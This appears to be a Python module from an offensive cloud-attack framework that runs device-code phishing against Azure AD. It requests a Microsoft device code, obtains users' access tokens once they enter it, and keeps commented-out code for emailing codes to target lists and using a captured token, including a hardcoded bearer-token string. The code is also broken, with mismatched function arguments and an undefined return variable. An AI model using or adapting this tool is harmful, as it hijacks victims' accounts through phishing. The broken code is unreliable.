import json
import sys

import mongoengine
import flask_mongoengine
import requests
import werkzeug
from termcolor import colored
from database import models

import requests

import os
import adal
#from azure.mgmt.resource import SubscriptionClient

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "RESOURCE": {
        "value": "https://graph.windows.net",
        "required": "true",
        "description": "Resource URL"
    },
    "TENANT": {
        "value": "https://graph.windows.net",
        "required": "true",
        "description": "Resource URL"
    },
    "CLIENT-ID": {
        #"value": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        #"value": "1950a258-227b-4e31-a9cf-717495945fc2",
        "value": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "required": "true",
        "description": "The Application Client-ID"
    },
    "SEND-EMAIL": {
        "value": "false",
        "required": "true",
        "description": "Make this true if you want to automatically send email to the below emails, or false to just get the code."
    },
    "TARGET-EMAIL-WORDLIST": {
        "value": "",
        "required": "false",
        "description": "The keywords to check for on emails"
    },
    "REFRESH": {
        "value": "false",
        "required": "true",
        "description": "The keywords to check for on emails"
    },
    "DEVICE-CODE": {
        "value": "",
        "required": "false",
        "description": "Only add this if you are using REFRESH"
    }
}

description = ""

aws_command = "No awscli command"




def exploit(workspace):
    device_code_request = {}
    resource = variables['RESOURCE']['value']
    client_id = variables['CLIENT-ID']['value']
    send_mail = variables['SEND-EMAIL']['value']
    target_email_wordlist = variables['TARGET-EMAIL-WORDLIST']['value']
    refresh = variables['REFRESH']['value']
    tenant = variables['TENANT']['value']

    if not tenant == "":
        authority_host_uri = 'https://login.microsoftonline.com/{}'.format(tenant)
    else:
        authority_host_uri = 'https://login.microsoftonline.com/common'

    context = adal.AuthenticationContext(authority_host_uri, api_version=None,
                                         verify_ssl=True)

    code = context.acquire_user_code(resource, client_id)


    if refresh.lower().replace("\n", "").strip() == 'false':
        token = authenticate_device_code(tenant, client_id, resource).json()

        return {
            "userId": token
        }, 200




        """try:
            requestbody = {
                "client_id": client_id,
                "resource": resource
            }

            device_code_request = requests.post(
                #"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
                "https://login.microsoftonline.com/{}/oauth2/devicecode?api-version=1.0".format(tenant),
                data=requestbody
            )

            if device_code_request.status_code == 200:
                if send_mail.lower().strip().replace("\n", "") == 'true':
                    email_file = open(target_email_wordlist, 'r')

                    for email in email_file.readlines():
                        send_email(email.strip().replace("\n", ""), device_code_request.json()['user_code'])

                else:
                    device_code_request.json()['instructions'] = "Run this module periodically with REFRESH set to True to get the tokens."
                    return {
                        "user_code": device_code_request.json()
                    }, 200
            else:
                return {"error": device_code_request.json()}

        except:
            pass"""

    else:
        """device_code = ""

        if variables['DEVICE-CODE']['value'] == "":
            device_code = device_code_request['device_code']
        else:
            device_code = variables['DEVICE-CODE']['value']

        tokenrequestbody = {
            "client_id": client_id,
            "resource": resource,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "code": device_code
        }

        token_request = requests.post(
            #"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
            "https://login.microsoftonline.com/{}/oauth2/token?api-version=1.0".format(tenant),
            data=tokenrequestbody
        )

        if token_request.status_code == 400:
            return {"device_code": {
                        "message": "Still no authentication done by the target",
                        "device_code": device_code
                }}

        elif token_request.status_code == 200:
            returned_request = token_request.json()
            returned_request['device_code'] = device_code

            access_token = returned_request['access_token']

            #access_token = "EwBgA8l6BAAUkj1NuJYtTVha+Mogk+HEiPbQo04AAcTD5M3GuaL7hH/1zeaU9r3vziuCOP1FjEax1nBL8Mcm7XQBDtGGzPxqPQKuEil3tsePk44SfXC28R1ZW48E6G53KOekp9jDWqYguCe2nz91fzpuGK9h0aE3isRxtW0Y6qdaUeIt5Dd7YbVgbKJK08tsxM6l6bj+xhl/f5ivobQDkFvCtmrSTIrR9508aQVjOALPoq/1io+ul6c/xZ542o55g2LSTdFhKBdgobr0SU2LHKOtfImzk0EG+TNYauxtGedilhFgA8apRHbLNJsub4eb+MHskJdZyImi+IfpDLD84tSNaL4Mlz1cPgTaTLB7UzbqL8ul1lp7vbwWgFjz4U4DZgAACMrl9ARGXqiGMAJET5KmdSGMwp1R6LWvni2X6yLpGuOpF6cT7g2a+8ukN2vX20iicnKdH7xjPjK3Fb/OmyNOIqsyNdjsfzDyAh3I8b7Pv1hokFnzMzqpJMvL6MpzJaULILexsFnrnYcTEX+krv5azpma6z8Hlo1Q2RzOL7x8pvVJQExTHZwSpLGfebbLw4wrn79ZsVXSUjyaghNcBmSOfPrVP521ztwatrorl1ChS+rMSk8zKeW8hLPvjJx/wr+bn5jsVLvGPCZbORADMZ6Hqhkn/r5M6NeLWhRM+AX3/tM2grStODr4JGHAX67fohWfYigwHkMIqSg4mxy6qn510fCHfiqtxWakngbb03iC0JpPEaK8560gUmUiGTd0kYF6/2/u/pTyEpSuJx/gOKn8WZRgGSWfJJu0pV7gMis3KWVVxNE7ojqHG0P4uxgr3GD3Rtx60pFVrW3nvQMsFYBzxKEm4xMZVwxdKZGZHQLR2OzboSSWHeSGsC98oApwGc+kJAuCNeNmag1GtHaa0nC9l83ewgNhY50K7bmbQY3oQaEHaLoe9fEg3SgcIrSKb/qA7NLs5wsufdnd1jFhiW6RZYvag93ouEjfc4sFitgCr9YqULaFI7QC6mWTxhmbWCA5YouWtuX5jMH0Sk4EFVNtE3WMUQ/CAPoUpnGm8WbJCCU+H48+eCKYOyKTYo0R28cbY/Y9rcM+fX50Y4fy4ghkhF65EsuOhmEpDOCqOXABUMJqUvGGsw81TaNnK3oC"
            print(requests.get("https://graph.microsoft.com/v1.0/me",
                               headers={
                                    'Content-Type': 'application/json',
                                    'Authorization': 'Bearer {}'.format(access_token)
                                }).text)"""

        token = context.acquire_token_with_device_code(resource, code, client_id)

        return {"device_code": {
                    "token": returned_request,
                    "device_code": device_code
            }}



def send_email(email, device_code):
    print(email, device_code)

def authenticate_device_code(authority_host_uri, context, tenant, client_id, resource_uri):
    """
    Authenticate the end-user using device auth.
    """

    """
    try:        
        context = adal.AuthenticationContext(auth_url)
        code = context.acquire_user_code(resource, client_id)
        print(code)

        token = context.acquire_token_with_device_code(resource, code, client_id)

        return {"Phishing":{
            "Phishing": "Device Code",
            "token": token
        }}, 200
    except:
        return {
            "error": str(sys.exc_info())
        }, 500
    """
    #credential = azure.identity.InteractiveBrowserCredential()
    #subscription_client = SubscriptionClient(credential)

    #subscription = next(subscription_client.subscriptions.list())
    #print(subscription.subscription_id)
